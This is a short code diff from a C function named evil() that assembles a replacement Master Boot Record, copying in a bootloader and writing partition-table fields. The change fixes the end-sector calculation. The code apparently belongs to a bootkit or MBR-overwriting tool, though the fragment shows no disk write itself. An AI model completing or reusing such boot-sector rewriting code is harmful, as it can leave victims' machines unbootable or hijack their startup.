@@ -194,12 +194,12 @@ void evil()
 		BYTE StartSector[] = {0x03};
 		BYTE StartCylinder[] = {0x00};
 		BYTE SystemId[] = {0x07};
-		BYTE EndSector[] = {0x03};
 		DWORD RelativeSector = 128;
 		DWORD TotalSectors = (DWORD)uint8to64(backup_lba) -128;
 		DWORD EndCylinder = TotalSectors / (OutBuffer.TracksPerCylinder * OutBuffer.SectorsPerTrack);
 		DWORD remainder = TotalSectors - (EndCylinder * OutBuffer.TracksPerCylinder * OutBuffer.SectorsPerTrack);
 		DWORD EndHead = remainder / OutBuffer.SectorsPerTrack;
+		DWORD EndSector = remainder % OutBuffer.SectorsPerTrack + 1;
 		memcpy(NewMbr,bootloader,512);
 		memcpy(NewMbr + 440, special, 4);
 		memcpy(NewMbr + 446, bootflag, 1);
@@ -208,7 +208,7 @@ void evil()
 		memcpy(NewMbr + 449, StartCylinder, 1);
 		memcpy(NewMbr + 450, SystemId, 1);
 		memcpy(NewMbr + 451, &EndHead, 1);
-		memcpy(NewMbr + 452, EndSector, 1);
+		memcpy(NewMbr + 452, &EndSector, 1);
 		memcpy(NewMbr + 453, &EndCylinder, 1);
 		memcpy(NewMbr + 454, &RelativeSector, 4);
 		memcpy(NewMbr + 458, &TotalSectors, 4);
